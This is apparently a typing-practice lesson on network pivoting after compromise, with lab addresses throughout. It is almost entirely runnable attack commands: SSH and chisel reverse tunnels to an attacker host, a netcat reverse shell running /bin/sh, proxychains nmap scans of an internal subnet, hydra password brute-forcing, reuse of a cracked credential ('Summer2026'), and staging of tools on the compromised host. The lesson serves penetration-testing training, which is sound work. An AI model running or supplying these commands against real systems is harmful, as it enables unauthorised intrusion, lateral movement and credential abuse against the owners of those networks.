# Pivoting and Tunneling - Typing

This lesson types the pivot workflow: map the compromised host's network,
build SSH tunnels, proxy tools through the pivot, and enumerate the internal
network. The attacker is 10.10.20.25, the compromised host is 10.10.20.5,
and the internal network is 172.16.30.0/24.

## Map the compromised host

The pivot target reveals the internal network from its own state.

```bash
# show the compromised host's interfaces
ip addr

# show the routes it can reach
ip route

# show the neighbors it has spoken to
ip neigh
```

The route output names the internal network to pivot into.

## Confirm the internal network

Verify the internal subnet exists before building tunnels.

```bash
# show the routing table entries for the internal network
ip route | grep 172.16.30

# ping the internal network gateway from the host
ping -c 1 172.16.30.1
```

A reachable internal range is the pivot destination.

## SSH local forward

Expose the internal web service as a local port.

```bash
# forward local port 8080 to the internal web server
ssh -L 8080:172.16.30.10:80 admin@10.10.20.5

# in a second terminal, reach the internal service locally
curl -s http://localhost:8080 | head -n 10
```

localhost:8080 now represents the internal web server.

## SSH remote forward

Deliver a reverse connection back to the attacker.

```bash
# expose the attacker's port 4444 on the compromised host
ssh -R 9000:localhost:4444 admin@10.10.20.5

# on the attacker: start the reverse listener
nc -lvnp 4444

# on the compromised host: connect to the forwarded port
nc -v 127.0.0.1 9000 -e /bin/sh
```

The internal connection arrives at the attacker's listener.

## SSH dynamic forward

Turn the connection into a SOCKS proxy for the whole network.

```bash
# start a SOCKS proxy on local port 1080
ssh -D 1080 -N admin@10.10.20.5
```

The -N flag keeps the connection open without a shell.

## Configure proxychains

Point proxychains at the SOCKS proxy.

```bash
# edit the proxychains configuration
sudo vim /etc/proxychains.conf

# the dynamic chain section must end with the local proxy line
tail -n 3 /etc/proxychains.conf
```

The final proxy line lists the tunnel endpoint.

## Scan through the proxy

Route enumeration traffic through the pivot.

```bash
# scan the internal subnet through the SOCKS proxy
sudo proxychains4 nmap -sT -Pn -sV 172.16.30.10 172.16.30.15

# save the scan output
sudo proxychains4 nmap -sT -Pn -sV 172.16.30.10 \
    -oA enum/internal/internal-scan
```

The internal scan produces the second enumeration table.

## Reach internal services with curl

Web tools ride the same proxy.

```bash
# fetch an internal web page through the proxy
curl -sx socks5h://127.0.0.1:1080 http://172.16.30.10

# probe an internal path through the proxy
curl -sx socks5h://127.0.0.1:1080 \
    -o /dev/null -w '%{http_code}\n' http://172.16.30.10/admin
```

The socks5h variant resolves names through the proxy too.

## Test internal credentials

Reuse recovered credentials against internal services.

```bash
# run a credential check through the proxy
proxychains4 hydra -l admin -P exploit/wordlist.txt \
    ssh://172.16.30.15

# verify a reused credential on an internal host
sshpass -p 'Summer2026' ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' \
    admin@172.16.30.15 'id'
```

Credential reuse extends the access into the internal network.

## Use chisel when SSH is blocked

Chisel tunnels without SSH, through a single binary.

```bash
# on the attacker: run the chisel server
./chisel server --reverse --port 9090

# on the compromised host: run the client
./chisel client 10.10.20.25:9090 R:socks

# on the attacker: the SOCKS endpoint is available locally
curl -sx socks5h://127.0.0.1:1081 http://172.16.30.10
```

The reverse flag makes the client dial out, which passes inbound filters.

## Forward a database port

A local forward exposes an internal database to the attacker's client.

```bash
# forward local port 3306 to the internal database
ssh -L 3306:172.16.30.15:3306 -N admin@10.10.20.5

# connect to the database through the forward
mysql -h 127.0.0.1 -u admin -p

# list the databases to confirm access
SHOW DATABASES;
```

The database client never leaves the attacker machine.

## Transfer tools through the pivot

Tools move through the same connection.

```bash
# copy a tool to the compromised host over SCP
scp -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' \
    chisel admin@10.10.20.5:/tmp/chisel

# verify the transfer
ssh admin@10.10.20.5 'ls -l /tmp/chisel'
```

The tool is staged for the next pivot leg.

## Reuse one connection

SSH control sockets keep a single tunnel for many commands.

```bash
# create a shared control connection
ssh -M -S /tmp/pivot.sock -N -f admin@10.10.20.5

# run commands through the existing connection
ssh -S /tmp/pivot.sock admin@10.10.20.5 'ip route'

# add a forward on the running connection
ssh -S /tmp/pivot.sock -O forward -L 8081:172.16.30.11:80

# close the shared connection
ssh -S /tmp/pivot.sock -O exit admin@10.10.20.5
```

One authenticated session carries every pivot operation.

## Verify each internal hop

Confirm each internal service through the proxy before trusting it.

```bash
# check the internal web server's banner
curl -sx socks5h://127.0.0.1:1080 http://172.16.30.10 -I

# check the internal SSH version
proxychains4 nc -w 3 172.16.30.15 22

# confirm the database port answers
proxychains4 nc -w 3 172.16.30.15 3306
```

Verified hops are the evidence the report will cite.

## Configure proxychains in detail

The chain mode decides how failures are handled.

```bash
# dynamic chain: skip dead proxies and continue
grep -E '^(dynamic_chain|strict_chain)' /etc/proxychains.conf

# list the active proxy at the bottom of the file
grep -E '^socks' /etc/proxychains.conf

# enable the DNS resolution mode for the chain
grep -E '^proxy_dns' /etc/proxychains.conf
```

Dynamic mode keeps the pivot alive when one leg of the chain fails.

## Scan the full internal range

The pivot enables enumeration of the entire internal subnet.

```bash
# host discovery through the proxy
sudo proxychains4 nmap -sn 172.16.30.0/24

# full service scan of the discovered hosts
sudo proxychains4 nmap -sT -Pn -p- --open \
    172.16.30.10 172.16.30.11 172.16.30.15

# save the internal scan evidence
sudo proxychains4 nmap -sT -Pn -sV \
    172.16.30.0/24 -oA enum/internal/range-scan
```

The internal range scan is the second full enumeration pass.

## Document the pivot chain

Record each hop as evidence for the report.

```bash
# write the pivot notes
cat > enum/internal/pivot-notes.md <<'EOF'
# Pivot chain

attacker 10.10.20.25
  -> ssh 10.10.20.5
  -> socs 127.0.0.1:1080
  -> 172.16.30.10 web
  -> 172.16.30.15 ssh (admin:Summer2026)
EOF

# show the notes
cat enum/internal/pivot-notes.md
```

Every hop in the chain is reproducible from the notes.

## Wrap up

Pivot sequence: map host routes -> choose tunnel -> build the tunnel -> proxy
tools -> internal enumeration -> internal access -> document the chain.
